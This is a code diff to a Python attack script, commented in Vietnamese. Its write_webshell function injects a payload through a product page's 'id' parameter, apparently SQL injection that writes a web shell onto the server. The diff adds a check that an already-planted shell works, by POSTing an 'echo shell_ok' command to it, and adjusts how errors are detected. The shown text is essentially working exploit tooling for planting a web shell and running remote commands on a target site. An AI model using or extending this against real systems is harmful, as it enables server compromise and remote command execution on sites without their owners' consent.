@@ -18,6 +18,13 @@ from pathlib import Path
 
 import requests
 
+if hasattr(sys.stdout, "reconfigure"):
+    try:
+        sys.stdout.reconfigure(encoding="utf-8")
+        sys.stderr.reconfigure(encoding="utf-8")
+    except Exception:
+        pass
+
 
 # ============================================================
 # CẤU HÌNH
@@ -79,7 +86,16 @@ def write_webshell(base):
 
     r = requests.get(f"{base}/product", params={"id": payload}, timeout=10)
 
-    if any(m in r.text for m in ["SQL syntax", "Errcode", "already exists"]):
+    if "already exists" in r.text:
+        try:
+            chk = requests.post(f"{base}{SHELL_URL_PATH}", data={"cmd": "echo shell_ok"}, timeout=5)
+            if "shell_ok" in chk.text:
+                ok(f"Shell đã tồn tại và sẵn sàng: {SHELL_URL_PATH}")
+                return True
+        except Exception:
+            pass
+
+    if any(m in r.text for m in ["SQL syntax", "Errcode"]):
         err("Ghi shell thất bại")
         m = re.search(r"SQLSTATE.{0,200}", r.text)
         if m:
